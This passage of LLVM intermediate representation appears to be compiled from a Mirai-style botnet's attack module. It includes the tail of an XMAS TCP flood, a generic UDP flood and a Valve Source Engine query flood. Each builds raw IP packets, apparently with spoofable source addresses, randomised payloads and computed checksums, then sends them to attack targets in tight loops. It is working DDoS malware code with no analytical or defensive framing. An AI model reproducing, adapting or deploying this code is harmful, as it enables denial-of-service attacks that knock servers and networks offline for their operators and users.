  %252 = bitcast i8* %251 to i16*
  store i16 0, i16* %252, align 4
  br i1 %137, label %255, label %253

; <label>:253:                                    ; preds = %.lr.ph.split.us
  %254 = getelementptr inbounds i8, i8* %248, i64 40
  call void @rand_str(i8* %254, i32 %37)
  %.pre174 = load i32, i32* %5, align 4
  br label %255

; <label>:255:                                    ; preds = %253, %.lr.ph.split.us
  %256 = phi i32 [ %.pre174, %253 ], [ %storemerge139160.us, %.lr.ph.split.us ]
  %257 = getelementptr inbounds i8, i8* %248, i64 10
  %258 = bitcast i8* %257 to i16*
  store i16 0, i16* %258, align 2
  %259 = bitcast i8* %248 to i16*
  %260 = call zeroext i16 @checksum_generic(i16* %259, i32 20)
  store i16 %260, i16* %258, align 2
  %261 = sext i32 %256 to i64
  %262 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %261, i32 1
  %263 = load i32, i32* %262, align 4
  %264 = add i32 %263, 1
  store i32 %264, i32* %262, align 4
  %265 = trunc i32 %263 to i16
  %266 = call zeroext i16 @htons(i16 zeroext %265) #12
  %267 = zext i16 %266 to i32
  %268 = getelementptr inbounds i8, i8* %248, i64 24
  %269 = bitcast i8* %268 to i32*
  store i32 %267, i32* %269, align 4
  %270 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %261, i32 2
  %271 = load i32, i32* %270, align 4
  %272 = trunc i32 %271 to i16
  %273 = call zeroext i16 @htons(i16 zeroext %272) #12
  %274 = zext i16 %273 to i32
  %275 = getelementptr inbounds i8, i8* %248, i64 28
  %276 = bitcast i8* %275 to i32*
  store i32 %274, i32* %276, align 4
  %277 = getelementptr inbounds i8, i8* %248, i64 36
  %278 = bitcast i8* %277 to i16*
  store i16 0, i16* %278, align 4
  %279 = call zeroext i16 @htons(i16 zeroext %139) #12
  %280 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %249, i8* %250, i16 zeroext %279, i32 %140)
  store i16 %280, i16* %278, align 4
  %281 = getelementptr inbounds i8, i8* %248, i64 22
  %282 = bitcast i8* %281 to i16*
  %283 = load i16, i16* %282, align 2
  %284 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %261, i32 0, i32 1
  store i16 %283, i16* %284, align 2
  %285 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %261, i32 0
  %286 = bitcast %struct.sockaddr_in* %285 to %struct.sockaddr*
  %287 = call i64 @sendto(i32 %40, i8* %248, i64 %.pre-phi177, i32 16384, %struct.sockaddr* %286, i32 16) #11
  %288 = load i32, i32* %5, align 4
  %289 = add nsw i32 %288, 1
  store i32 %289, i32* %5, align 4
  %290 = icmp slt i32 %289, %46
  br i1 %290, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %298
  %storemerge139160 = phi i32 [ %332, %298 ], [ 0, %.lr.ph.split.preheader ]
  %291 = sext i32 %storemerge139160 to i64
  %292 = getelementptr inbounds i8*, i8** %14, i64 %291
  %293 = load i8*, i8** %292, align 8
  %294 = bitcast i8* %293 to %struct.iphdr*
  %295 = getelementptr inbounds i8, i8* %293, i64 20
  br i1 %137, label %298, label %296

; <label>:296:                                    ; preds = %.lr.ph.split
  %297 = getelementptr inbounds i8, i8* %293, i64 40
  call void @rand_str(i8* %297, i32 %37)
  %.pre = load i32, i32* %5, align 4
  br label %298

; <label>:298:                                    ; preds = %.lr.ph.split, %296
  %299 = phi i32 [ %storemerge139160, %.lr.ph.split ], [ %.pre, %296 ]
  %300 = getelementptr inbounds i8, i8* %293, i64 10
  %301 = bitcast i8* %300 to i16*
  store i16 0, i16* %301, align 2
  %302 = bitcast i8* %293 to i16*
  %303 = call zeroext i16 @checksum_generic(i16* %302, i32 20)
  store i16 %303, i16* %301, align 2
  %304 = sext i32 %299 to i64
  %305 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %304, i32 1
  %306 = load i32, i32* %305, align 4
  %307 = add i32 %306, 1
  store i32 %307, i32* %305, align 4
  %308 = trunc i32 %306 to i16
  %309 = call zeroext i16 @htons(i16 zeroext %308) #12
  %310 = zext i16 %309 to i32
  %311 = getelementptr inbounds i8, i8* %293, i64 24
  %312 = bitcast i8* %311 to i32*
  store i32 %310, i32* %312, align 4
  %313 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %12, i64 %304, i32 2
  %314 = load i32, i32* %313, align 4
  %315 = trunc i32 %314 to i16
  %316 = call zeroext i16 @htons(i16 zeroext %315) #12
  %317 = zext i16 %316 to i32
  %318 = getelementptr inbounds i8, i8* %293, i64 28
  %319 = bitcast i8* %318 to i32*
  store i32 %317, i32* %319, align 4
  %320 = getelementptr inbounds i8, i8* %293, i64 36
  %321 = bitcast i8* %320 to i16*
  store i16 0, i16* %321, align 4
  %322 = call zeroext i16 @htons(i16 zeroext %139) #12
  %323 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %294, i8* %295, i16 zeroext %322, i32 %140)
  store i16 %323, i16* %321, align 4
  %324 = getelementptr inbounds i8, i8* %293, i64 22
  %325 = bitcast i8* %324 to i16*
  %326 = load i16, i16* %325, align 2
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %304, i32 0, i32 1
  store i16 %326, i16* %327, align 2
  %328 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %304, i32 0
  %329 = bitcast %struct.sockaddr_in* %328 to %struct.sockaddr*
  %330 = call i64 @sendto(i32 %40, i8* %293, i64 %.pre-phi177, i32 16384, %struct.sockaddr* %329, i32 16) #11
  %331 = load i32, i32* %5, align 4
  %332 = add nsw i32 %331, 1
  store i32 %332, i32* %5, align 4
  %333 = icmp slt i32 %332, %46
  br i1 %333, label %.lr.ph.split, label %.loopexit.loopexit204

.loopexit150.loopexit:                            ; preds = %103
  br label %.loopexit150

.loopexit150.loopexit205:                         ; preds = %159
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit205, %.loopexit150.loopexit, %4, %82
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = trunc i32 %21 to i16
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = load i32, i32* @LOCAL_ADDR, align 4
  %26 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %25)
  %27 = and i32 %21, 65535
  %28 = icmp ugt i32 %27, 1460
  %. = select i1 %28, i16 1460, i16 %22
  %29 = tail call i32 @socket(i32 2, i32 3, i32 17) #11
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %219, label %31

; <label>:31:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %32 = bitcast i32* %5 to i8*
  %33 = call i32 @setsockopt(i32 %29, i32 0, i32 3, i8* nonnull %32, i32 4) #11
  %34 = icmp eq i32 %33, -1
  br i1 %34, label %68, label %.preheader84

.preheader84:                                     ; preds = %31
  store i32 0, i32* %5, align 4
  %35 = zext i8 %0 to i32
  %36 = icmp eq i8 %0, 0
  br i1 %36, label %.preheader, label %.lr.ph86

.lr.ph86:                                         ; preds = %.preheader84
  %37 = add i16 %., 28
  %38 = icmp eq i8 %16, 0
  %39 = add i16 %., 8
  %40 = zext i8 %0 to i64
  br i1 %38, label %.lr.ph86.split.us.preheader, label %.lr.ph86.split.preheader

.lr.ph86.split.preheader:                         ; preds = %.lr.ph86
  br label %.lr.ph86.split

.lr.ph86.split.us.preheader:                      ; preds = %.lr.ph86
  br label %.lr.ph86.split.us

.lr.ph86.split.us:                                ; preds = %.lr.ph86.split.us.preheader, %.lr.ph86.split.us
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph86.split.us ], [ 0, %.lr.ph86.split.us.preheader ]
  %41 = call noalias i8* @calloc(i64 1510, i64 1) #11
  %42 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %41, i8** %42, align 8
  %43 = getelementptr inbounds i8, i8* %41, i64 20
  store i8 69, i8* %41, align 4
  %44 = getelementptr inbounds i8, i8* %41, i64 1
  store i8 %10, i8* %44, align 1
  %45 = call zeroext i16 @htons(i16 zeroext %37) #12
  %46 = getelementptr inbounds i8, i8* %41, i64 2
  %47 = bitcast i8* %46 to i16*
  store i16 %45, i16* %47, align 2
  %48 = call zeroext i16 @htons(i16 zeroext %12) #12
  %49 = getelementptr inbounds i8, i8* %41, i64 4
  %50 = bitcast i8* %49 to i16*
  store i16 %48, i16* %50, align 4
  %51 = getelementptr inbounds i8, i8* %41, i64 8
  store i8 %14, i8* %51, align 4
  %52 = getelementptr inbounds i8, i8* %41, i64 9
  store i8 17, i8* %52, align 1
  %53 = getelementptr inbounds i8, i8* %41, i64 12
  %54 = bitcast i8* %53 to i32*
  store i32 %26, i32* %54, align 4
  %55 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %56 = load i32, i32* %55, align 4
  %57 = getelementptr inbounds i8, i8* %41, i64 16
  %58 = bitcast i8* %57 to i32*
  store i32 %56, i32* %58, align 4
  %59 = call zeroext i16 @htons(i16 zeroext %18) #12
  %60 = bitcast i8* %43 to i16*
  store i16 %59, i16* %60, align 2
  %61 = call zeroext i16 @htons(i16 zeroext %20) #12
  %62 = getelementptr inbounds i8, i8* %41, i64 22
  %63 = bitcast i8* %62 to i16*
  store i16 %61, i16* %63, align 2
  %64 = call zeroext i16 @htons(i16 zeroext %39) #12
  %65 = getelementptr inbounds i8, i8* %41, i64 24
  %66 = bitcast i8* %65 to i16*
  store i16 %64, i16* %66, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %67 = icmp slt i64 %indvars.iv.next, %40
  br i1 %67, label %.lr.ph86.split.us, label %..preheader_crit_edge.loopexit

; <label>:68:                                     ; preds = %31
  %69 = call i32 @close(i32 %29) #11
  br label %219

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph86.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit99:                 ; preds = %.lr.ph86.split
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit99, %..preheader_crit_edge.loopexit
  %.lcssa87.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next92, %..preheader_crit_edge.loopexit99 ]
  %.lcssa87 = trunc i64 %.lcssa87.in to i32
  store i32 %.lcssa87, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader84, %..preheader_crit_edge
  %70 = icmp eq i32 %26, -1
  %71 = and i32 %11, 65535
  %72 = icmp eq i32 %71, 65535
  %73 = and i32 %17, 65535
  %74 = icmp eq i32 %73, 65535
  %75 = and i32 %19, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = icmp eq i8 %24, 0
  %78 = zext i16 %. to i64
  %79 = add nuw nsw i64 %78, 8
  %80 = trunc i64 %79 to i32
  %81 = add nuw nsw i64 %78, 28
  %82 = zext i16 %. to i32
  br label %.loopexit

.lr.ph86.split:                                   ; preds = %.lr.ph86.split.preheader, %.lr.ph86.split
  %indvars.iv91 = phi i64 [ %indvars.iv.next92, %.lr.ph86.split ], [ 0, %.lr.ph86.split.preheader ]
  %83 = call noalias i8* @calloc(i64 1510, i64 1) #11
  %84 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv91
  store i8* %83, i8** %84, align 8
  %85 = getelementptr inbounds i8, i8* %83, i64 20
  store i8 69, i8* %83, align 4
  %86 = getelementptr inbounds i8, i8* %83, i64 1
  store i8 %10, i8* %86, align 1
  %87 = call zeroext i16 @htons(i16 zeroext %37) #12
  %88 = getelementptr inbounds i8, i8* %83, i64 2
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %12) #12
  %91 = getelementptr inbounds i8, i8* %83, i64 4
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 4
  %93 = getelementptr inbounds i8, i8* %83, i64 8
  store i8 %14, i8* %93, align 4
  %94 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %95 = getelementptr inbounds i8, i8* %83, i64 6
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  %97 = getelementptr inbounds i8, i8* %83, i64 9
  store i8 17, i8* %97, align 1
  %98 = getelementptr inbounds i8, i8* %83, i64 12
  %99 = bitcast i8* %98 to i32*
  store i32 %26, i32* %99, align 4
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv91, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = getelementptr inbounds i8, i8* %83, i64 16
  %103 = bitcast i8* %102 to i32*
  store i32 %101, i32* %103, align 4
  %104 = call zeroext i16 @htons(i16 zeroext %18) #12
  %105 = bitcast i8* %85 to i16*
  store i16 %104, i16* %105, align 2
  %106 = call zeroext i16 @htons(i16 zeroext %20) #12
  %107 = getelementptr inbounds i8, i8* %83, i64 22
  %108 = bitcast i8* %107 to i16*
  store i16 %106, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %39) #12
  %110 = getelementptr inbounds i8, i8* %83, i64 24
  %111 = bitcast i8* %110 to i16*
  store i16 %109, i16* %111, align 2
  %indvars.iv.next92 = add nsw i64 %indvars.iv91, 1
  %112 = icmp slt i64 %indvars.iv.next92, %40
  br i1 %112, label %.lr.ph86.split, label %..preheader_crit_edge.loopexit99

.loopexit.loopexit:                               ; preds = %144
  br label %.loopexit.backedge

.loopexit.loopexit98:                             ; preds = %196
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %36, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit98
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %70, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %144
  %storemerge8385.us = phi i32 [ %165, %144 ], [ 0, %.lr.ph.split.us.preheader ]
  %113 = sext i32 %storemerge8385.us to i64
  %114 = getelementptr inbounds i8*, i8** %8, i64 %113
  %115 = load i8*, i8** %114, align 8
  %116 = bitcast i8* %115 to %struct.iphdr*
  %117 = getelementptr inbounds i8, i8* %115, i64 20
  %118 = getelementptr inbounds i8, i8* %115, i64 28
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %113, i32 2
  %120 = load i8, i8* %119, align 4
  %121 = icmp ult i8 %120, 32
  br i1 %121, label %122, label %129

; <label>:122:                                    ; preds = %.lr.ph.split.us
  %123 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %113, i32 1
  %124 = load i32, i32* %123, align 4
  %125 = call i32 @ntohl(i32 %124) #12
  %126 = call i32 @htonl(i32 %125) #12
  %127 = getelementptr inbounds i8, i8* %115, i64 16
  %128 = bitcast i8* %127 to i32*
  store i32 %126, i32* %128, align 4
  br label %129

; <label>:129:                                    ; preds = %.lr.ph.split.us, %122
  %130 = getelementptr inbounds i8, i8* %115, i64 12
  %131 = bitcast i8* %130 to i32*
  store i32 0, i32* %131, align 4
  br i1 %72, label %132, label %135

; <label>:132:                                    ; preds = %129
  %133 = getelementptr inbounds i8, i8* %115, i64 4
  %134 = bitcast i8* %133 to i16*
  store i16 0, i16* %134, align 4
  br label %135

; <label>:135:                                    ; preds = %132, %129
  br i1 %74, label %136, label %138

; <label>:136:                                    ; preds = %135
  %137 = bitcast i8* %117 to i16*
  store i16 0, i16* %137, align 2
  br label %138

; <label>:138:                                    ; preds = %136, %135
  br i1 %76, label %139, label %142

; <label>:139:                                    ; preds = %138
  %140 = getelementptr inbounds i8, i8* %115, i64 22
  %141 = bitcast i8* %140 to i16*
  store i16 0, i16* %141, align 2
  br label %142

; <label>:142:                                    ; preds = %139, %138
  br i1 %77, label %144, label %143

; <label>:143:                                    ; preds = %142
  call void @rand_str(i8* nonnull %118, i32 %82)
  %.pre93 = load i32, i32* %5, align 4
  br label %144

; <label>:144:                                    ; preds = %143, %142
  %145 = phi i32 [ %.pre93, %143 ], [ %storemerge8385.us, %142 ]
  %146 = getelementptr inbounds i8, i8* %115, i64 10
  %147 = bitcast i8* %146 to i16*
  store i16 0, i16* %147, align 2
  %148 = bitcast i8* %115 to i16*
  %149 = call zeroext i16 @checksum_generic(i16* %148, i32 20)
  store i16 %149, i16* %147, align 2
  %150 = getelementptr inbounds i8, i8* %115, i64 26
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 2
  %152 = getelementptr inbounds i8, i8* %115, i64 24
  %153 = bitcast i8* %152 to i16*
  %154 = load i16, i16* %153, align 2
  %155 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %116, i8* nonnull %117, i16 zeroext %154, i32 %80)
  store i16 %155, i16* %151, align 2
  %156 = getelementptr inbounds i8, i8* %115, i64 22
  %157 = bitcast i8* %156 to i16*
  %158 = load i16, i16* %157, align 2
  %159 = sext i32 %145 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 0, i32 1
  store i16 %158, i16* %160, align 2
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 0
  %162 = bitcast %struct.sockaddr_in* %161 to %struct.sockaddr*
  %163 = call i64 @sendto(i32 %29, i8* nonnull %115, i64 %81, i32 16384, %struct.sockaddr* %162, i32 16) #11
  %164 = load i32, i32* %5, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %5, align 4
  %166 = icmp slt i32 %165, %35
  br i1 %166, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %196
  %storemerge8385 = phi i32 [ %217, %196 ], [ 0, %.lr.ph.split.preheader ]
  %167 = sext i32 %storemerge8385 to i64
  %168 = getelementptr inbounds i8*, i8** %8, i64 %167
  %169 = load i8*, i8** %168, align 8
  %170 = bitcast i8* %169 to %struct.iphdr*
  %171 = getelementptr inbounds i8, i8* %169, i64 20
  %172 = getelementptr inbounds i8, i8* %169, i64 28
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 2
  %174 = load i8, i8* %173, align 4
  %175 = icmp ult i8 %174, 32
  br i1 %175, label %176, label %183

; <label>:176:                                    ; preds = %.lr.ph.split
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %167, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = call i32 @ntohl(i32 %178) #12
  %180 = call i32 @htonl(i32 %179) #12
  %181 = getelementptr inbounds i8, i8* %169, i64 16
  %182 = bitcast i8* %181 to i32*
  store i32 %180, i32* %182, align 4
  br label %183

; <label>:183:                                    ; preds = %.lr.ph.split, %176
  br i1 %72, label %184, label %187

; <label>:184:                                    ; preds = %183
  %185 = getelementptr inbounds i8, i8* %169, i64 4
  %186 = bitcast i8* %185 to i16*
  store i16 0, i16* %186, align 4
  br label %187

; <label>:187:                                    ; preds = %184, %183
  br i1 %74, label %188, label %190

; <label>:188:                                    ; preds = %187
  %189 = bitcast i8* %171 to i16*
  store i16 0, i16* %189, align 2
  br label %190

; <label>:190:                                    ; preds = %188, %187
  br i1 %76, label %191, label %194

; <label>:191:                                    ; preds = %190
  %192 = getelementptr inbounds i8, i8* %169, i64 22
  %193 = bitcast i8* %192 to i16*
  store i16 0, i16* %193, align 2
  br label %194

; <label>:194:                                    ; preds = %191, %190
  br i1 %77, label %196, label %195

; <label>:195:                                    ; preds = %194
  call void @rand_str(i8* %172, i32 %82)
  %.pre = load i32, i32* %5, align 4
  br label %196

; <label>:196:                                    ; preds = %194, %195
  %197 = phi i32 [ %storemerge8385, %194 ], [ %.pre, %195 ]
  %198 = getelementptr inbounds i8, i8* %169, i64 10
  %199 = bitcast i8* %198 to i16*
  store i16 0, i16* %199, align 2
  %200 = bitcast i8* %169 to i16*
  %201 = call zeroext i16 @checksum_generic(i16* %200, i32 20)
  store i16 %201, i16* %199, align 2
  %202 = getelementptr inbounds i8, i8* %169, i64 26
  %203 = bitcast i8* %202 to i16*
  store i16 0, i16* %203, align 2
  %204 = getelementptr inbounds i8, i8* %169, i64 24
  %205 = bitcast i8* %204 to i16*
  %206 = load i16, i16* %205, align 2
  %207 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %170, i8* %171, i16 zeroext %206, i32 %80)
  store i16 %207, i16* %203, align 2
  %208 = getelementptr inbounds i8, i8* %169, i64 22
  %209 = bitcast i8* %208 to i16*
  %210 = load i16, i16* %209, align 2
  %211 = sext i32 %197 to i64
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %211, i32 0, i32 1
  store i16 %210, i16* %212, align 2
  %213 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %211, i32 0
  %214 = bitcast %struct.sockaddr_in* %213 to %struct.sockaddr*
  %215 = call i64 @sendto(i32 %29, i8* %169, i64 %81, i32 16384, %struct.sockaddr* %214, i32 16) #11
  %216 = load i32, i32* %5, align 4
  %217 = add nsw i32 %216, 1
  store i32 %217, i32* %5, align 4
  %218 = icmp slt i32 %217, %35
  br i1 %218, label %.lr.ph.split, label %.loopexit.loopexit98

; <label>:219:                                    ; preds = %4, %68
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = zext i8 %0 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #11
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 27015)
  %21 = trunc i32 %20 to i16
  tail call void @table_unlock_val(i8 zeroext 20)
  %22 = call i8* @table_retrieve_val(i32 20, i32* nonnull %6)
  %23 = call i32 @socket(i32 2, i32 3, i32 17) #11
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %215, label %25

; <label>:25:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %26 = bitcast i32* %5 to i8*
  %27 = call i32 @setsockopt(i32 %23, i32 0, i32 3, i8* nonnull %26, i32 4) #11
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %71, label %.preheader71

.preheader71:                                     ; preds = %25
  store i32 0, i32* %5, align 4
  %29 = zext i8 %0 to i32
  %30 = icmp eq i8 %0, 0
  br i1 %30, label %.preheader, label %.lr.ph73

.lr.ph73:                                         ; preds = %.preheader71
  %31 = icmp eq i8 %17, 0
  br i1 %31, label %.lr.ph73.split.us.preheader, label %.lr.ph73.split.preheader

.lr.ph73.split.preheader:                         ; preds = %.lr.ph73
  br label %.lr.ph73.split

.lr.ph73.split.us.preheader:                      ; preds = %.lr.ph73
  br label %.lr.ph73.split.us

.lr.ph73.split.us:                                ; preds = %.lr.ph73.split.us.preheader, %.lr.ph73.split.us
  %32 = phi i32 [ %69, %.lr.ph73.split.us ], [ 0, %.lr.ph73.split.us.preheader ]
  %33 = call noalias i8* @calloc(i64 128, i64 1) #11
  %34 = sext i32 %32 to i64
  %35 = getelementptr inbounds i8*, i8** %9, i64 %34
  store i8* %33, i8** %35, align 8
  %36 = getelementptr inbounds i8, i8* %33, i64 20
  %37 = getelementptr inbounds i8, i8* %33, i64 28
  store i8 69, i8* %33, align 4
  %38 = getelementptr inbounds i8, i8* %33, i64 1
  store i8 %11, i8* %38, align 1
  %39 = load i32, i32* %6, align 4
  %40 = trunc i32 %39 to i16
  %41 = add i16 %40, 32
  %42 = call zeroext i16 @htons(i16 zeroext %41) #12
  %43 = getelementptr inbounds i8, i8* %33, i64 2
  %44 = bitcast i8* %43 to i16*
  store i16 %42, i16* %44, align 2
  %45 = call zeroext i16 @htons(i16 zeroext %13) #12
  %46 = getelementptr inbounds i8, i8* %33, i64 4
  %47 = bitcast i8* %46 to i16*
  store i16 %45, i16* %47, align 4
  %48 = getelementptr inbounds i8, i8* %33, i64 8
  store i8 %15, i8* %48, align 4
  %49 = getelementptr inbounds i8, i8* %33, i64 9
  store i8 17, i8* %49, align 1
  %50 = load i32, i32* @LOCAL_ADDR, align 4
  %51 = getelementptr inbounds i8, i8* %33, i64 12
  %52 = bitcast i8* %51 to i32*
  store i32 %50, i32* %52, align 4
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %34, i32 1
  %54 = load i32, i32* %53, align 4
  %55 = getelementptr inbounds i8, i8* %33, i64 16
  %56 = bitcast i8* %55 to i32*
  store i32 %54, i32* %56, align 4
  %57 = call zeroext i16 @htons(i16 zeroext %19) #12
  %58 = bitcast i8* %36 to i16*
  store i16 %57, i16* %58, align 2
  %59 = call zeroext i16 @htons(i16 zeroext %21) #12
  %60 = getelementptr inbounds i8, i8* %33, i64 22
  %61 = bitcast i8* %60 to i16*
  store i16 %59, i16* %61, align 2
  %62 = add i16 %40, 12
  %63 = call zeroext i16 @htons(i16 zeroext %62) #12
  %64 = getelementptr inbounds i8, i8* %33, i64 24
  %65 = bitcast i8* %64 to i16*
  store i16 %63, i16* %65, align 2
  %66 = bitcast i8* %37 to i32*
  store i32 -1, i32* %66, align 4
  %67 = getelementptr inbounds i8, i8* %33, i64 32
  call void @util_memcpy(i8* %67, i8* %22, i32 %39) #11
  %68 = load i32, i32* %5, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %5, align 4
  %70 = icmp slt i32 %69, %29
  br i1 %70, label %.lr.ph73.split.us, label %.preheader.loopexit

; <label>:71:                                     ; preds = %25
  %72 = call i32 @close(i32 %23) #11
  br label %215

.preheader.loopexit:                              ; preds = %.lr.ph73.split.us
  br label %.preheader

.preheader.loopexit89:                            ; preds = %.lr.ph73.split
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit89, %.preheader.loopexit, %.preheader71
  %73 = and i32 %12, 65535
  %74 = icmp eq i32 %73, 65535
  %75 = and i32 %18, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = and i32 %20, 65535
  %78 = icmp eq i32 %77, 65535
  br label %.loopexit

.lr.ph73.split:                                   ; preds = %.lr.ph73.split.preheader, %.lr.ph73.split
  %79 = phi i32 [ %119, %.lr.ph73.split ], [ 0, %.lr.ph73.split.preheader ]
  %80 = call noalias i8* @calloc(i64 128, i64 1) #11
  %81 = sext i32 %79 to i64
  %82 = getelementptr inbounds i8*, i8** %9, i64 %81
  store i8* %80, i8** %82, align 8
  %83 = getelementptr inbounds i8, i8* %80, i64 20
  %84 = getelementptr inbounds i8, i8* %80, i64 28
  store i8 69, i8* %80, align 4
  %85 = getelementptr inbounds i8, i8* %80, i64 1
  store i8 %11, i8* %85, align 1
  %86 = load i32, i32* %6, align 4
  %87 = trunc i32 %86 to i16
  %88 = add i16 %87, 32
  %89 = call zeroext i16 @htons(i16 zeroext %88) #12
  %90 = getelementptr inbounds i8, i8* %80, i64 2
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 2
  %92 = call zeroext i16 @htons(i16 zeroext %13) #12
  %93 = getelementptr inbounds i8, i8* %80, i64 4
  %94 = bitcast i8* %93 to i16*
  store i16 %92, i16* %94, align 4
